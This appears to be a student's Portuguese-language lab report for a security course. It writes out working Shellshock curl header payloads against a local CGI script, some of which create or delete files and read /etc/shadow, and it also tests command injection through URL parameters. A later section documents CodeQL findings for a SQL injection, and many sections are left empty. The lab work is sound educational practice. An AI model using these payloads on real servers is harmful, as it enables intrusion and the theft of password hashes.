# Module 2

-------


# Parte A

## Exercise 2
### Ponto a) 
    curl -H "ATTACK:() {echo hello; }; echo Content_type: text/plain; echo; /bin/touch /tmp/ficheiro" localhost:8080/cgi-bin/vul.cgi

    curl -H "ATTACK:() { echo hello; }; /bin/bash -c \"touch /tmp/ficheiro\"" localhost:8080/cgi-bin/vul.cgi

![alt text](parte1_ex2_a_1.png "Código com espaços")

### Ponto b)
    curl -H "ATTACK:() { echo hello; }; echo Content_type: text/plain; echo; /bin/rm /tmp/ficheiro" localhost:8080/cgi-bin/vul.cgi

    curl -H "ATTACK:() { echo hello; }; /bin/bash -c \"rm /tmp/ficheiro\"" localhost:8080/cgi-bin/vul.cgi

![alt text](parte1_ex2_b_1.png "Código com espaços")

### Ponto c)
Para testar, tentou-se ler primeiro um ficheiro "ficheiro2" com texto no seu conteudo, através do código abaixo:

    curl -H "ATTACK:() { echo hello; }; echo Content_type: text/plain; echo; /bin/cat /tmp/ficheiro2" localhost:8080/cgi-bin/vul.cgi

Depois, correu-se o mesmo código para o ficheiro pretendido

    curl -H "ATTACK:() { echo hello; }; echo Content_type: text/plain; echo; /bin/cat /etc/shadow" localhost:8080/cgi-bin/vul.cgi

A figura abaixo apresenta os resultados.

![alt text](parte1_ex2_c_1.png "Código com espaços")

Como se pode observar, o primeiro ficheiro tinha dados e os mesmos foram impressos na linha de comandos.
No segundo código, nada foi apresentado.
Para garantir que o ficheiro tinha conteudo, abriu-se o docker em modo interativo e fez-se o cat desse mesmo ficheiro, como mostra a imagem abaixo.

![alt text](parte1_ex2_c_2.png "Código com espaços")

Para também se entender as permissões de leitura e escrita deste ficheiro, correu-se um código para obter o USER atual, e outro para obter as permissões do ficheiro.

![alt text](parte1_ex2_c_3.png "Código com espaços")

O que se pode observar é que o ficheiro necessita de permissões de root, mas o apache corre numa conta de user e não como root.



### Ponto d)
Não porque uma web url não aceita espaços, como no exemplo da figura abaixo, em que foi corrido o seguinte código:

    curl http://localhost:8080/cgi-bin/getenv.cgi?attack=/bin/rm /tmp/ficheiro

![alt text](parte1_ex2_d_1.png "Código com espaços")

Como podemos observar, os espaços são ignorados, e o sistema apenas lê o que está antes dos espaços.

Para tal, necessitamos de converter o espaço num código, sendo o espaço representado pelo código %20B.
Assim, o código fica:

    curl http://localhost:8080/cgi-bin/getenv.cgi?attack=/bin/rm%20B/tmp/ficheiro

O resultado é apresentado na figura abaixo.
![alt text](parte1_ex2_d_2.png "Código com espaços")

O problema neste caso é que o bash não converte este código num espaço literal.

Pelas razões acima referidas e como foi possivel observar, não é possivel fazer o ataque através dos parâmetros.



# Parte B

## Static analysis

### Ponto 2
Neste ponto 
Verificar a Github Action para correr a plataforma CWE analytics do CodeQL é executada quando há um evento de push no repositório. Nos sub pontos a e b o CodeQL irá ser atualizado ao mudar a descrição do Workflow.
#### a)
Nas imagens abaixo é possivel verificar as alterações da versão de action 1 para a versão 2:

![alt text](parte2_ex_2_a_1.jpeg "Código com espaços")

![alt text](parte2_ex_2_a_2.jpeg "Código com espaços")


#### b)
Nas imagens abaixo é possivel verificar a adição do código do workflow trigger.

![alt text](parte2_ex_2_b_1.jpeg "Código com espaços")

![alt text](parte2_ex_2_b_2.jpeg "Código com espaços")


### Ponto 3

Após executar a action e analisar os logs de output foi encontrado o comando da imagem abaixo utilizado pelo CodeQL Action para inicializar a base de dados de code analysis. 

![alt text](parte2_ex3.png "Código com espaços")


### Ponto 4

Neste ponto irá ser explorada a vulnerabilidade CWE-89. No code scanning da security está presente uma listagem das diferentes vulnerabilidades detetadas na aplicação com nível decrescente de vulnerabilidade. 

Como se pode observar na imagem seguinte foi pesquisada a entrada “Database query built from user-controlled sources” que apresenta uma lista de diversos ficheiros. 

![alt text](parte2_ex4_1.jpeg "Código com espaços")

O ficheiro que iremos explorar é denominado search.ts 

![alt text](parte2_ex4_2.jpeg "Código com espaços")


![alt text](parte2_ex4_3.jpeg "Código com espaços")
*image_caption*


Justify why CodeQL identified this code
as vulnerable. Include source and sink information. (more information about SQL Injection can
be found here https


### Ponto 5


## Dynamic analysis

### Ponto 6
![alt text](parte2_ex6.png "Código com espaços")


### Ponto 7
![alt text](parte2_ex7.png "Código com espaços")




### Ponto 8
![alt text](parte2_ex8_1.png "Código com espaços")

![alt text](parte2_ex8_2.png "Código com espaços")


### Ponto 9
#### a)

#### b)


### Ponto 10


### Ponto 11


### Ponto 12


### Ponto 13


### Ponto 14

